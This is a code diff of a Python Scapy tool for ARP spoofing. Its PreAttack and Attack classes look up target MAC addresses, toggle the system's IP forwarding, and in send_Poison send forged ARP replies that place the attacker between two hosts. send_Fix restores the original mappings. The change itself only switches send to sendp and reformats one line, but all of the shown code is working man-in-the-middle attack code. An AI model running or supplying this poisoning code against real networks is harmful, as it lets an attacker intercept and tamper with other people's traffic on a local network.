@@ -20,8 +20,7 @@ class PreAttack(object):
         self.interface = interface
 
     def get_MAC_Addr(self):
-        return srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=self.target), timeout=10, iface=self.interface)[0][0][1][
-            ARP].hwsrc
+        return srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=self.target), timeout=10, iface=self.interface)[0][0][1][ARP].hwsrc
 
     class toggle_IP_Forward(object):
         def __init__(self, path='/proc/sys/net/ipv4/ip_forward'):
@@ -45,13 +44,13 @@ class Attack(object):
         self.interface = interface
 
     def send_Poison(self, MACs):
-        send(ARP(op=2, pdst=self.target1, psrc=self.target2, hwdst=MACs[0]), iface=self.interface)
-        send(ARP(op=2, pdst=self.target2, psrc=self.target1, hwdst=MACs[1]), iface=self.interface)
+        sendp(ARP(op=2, pdst=self.target1, psrc=self.target2, hwdst=MACs[0]), iface=self.interface)
+        sendp(ARP(op=2, pdst=self.target2, psrc=self.target1, hwdst=MACs[1]), iface=self.interface)
 
     def send_Fix(self, MACs):
-        send(ARP(op=2, pdst=self.target1, psrc=self.target2, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=MACs[0]),
+        sendp(ARP(op=2, pdst=self.target1, psrc=self.target2, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=MACs[0]),
              iface=self.interface)
-        send(ARP(op=2, pdst=self.target2, psrc=self.target1, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=MACs[1]),
+        sendp(ARP(op=2, pdst=self.target2, psrc=self.target1, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=MACs[1]),
              iface=self.interface)
 
 
